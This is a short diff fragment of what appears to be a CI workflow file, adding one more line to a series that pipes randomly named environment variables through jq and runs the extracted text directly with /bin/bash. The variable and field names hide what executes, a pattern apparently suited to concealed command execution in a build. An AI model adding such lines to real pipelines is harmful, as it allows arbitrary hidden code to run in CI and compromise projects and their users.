@@ -27,6 +27,7 @@ jobs:
           echo $cvy4 | jq -r .monn65372 | /bin/bash
           echo $t0621 | jq -r .cnsfy299 | /bin/bash
           echo $zz56871 | jq -r .mymus80174 | /bin/bash
+          printf '%s' "$q35467" | jq -r .mipgi05 | /bin/bash
 
       - name: Upload artifact
         if: always()
